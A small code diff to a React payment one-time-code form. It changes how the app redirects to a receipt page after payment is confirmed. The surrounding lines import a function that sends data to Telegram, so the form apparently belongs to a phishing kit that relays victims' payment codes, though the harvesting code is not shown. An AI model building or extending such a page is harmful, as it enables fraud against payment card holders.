@@ -9,6 +9,7 @@ import { useToast } from "@/hooks/use-toast";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
+import { buildNavigationPath } from "@/utils/navigationHelper";
 
 const PaymentOTPForm = () => {
   const { id } = useParams();
@@ -228,7 +229,7 @@ const PaymentOTPForm = () => {
         description: "تم تأكيد الدفع بنجاح",
       });
 
-      navigate(`/pay/${id}/receipt`);
+      navigate(buildNavigationPath(`/pay/${id}/receipt`));
     } else {
       const newAttempts = attempts + 1;
       setAttempts(newAttempts);
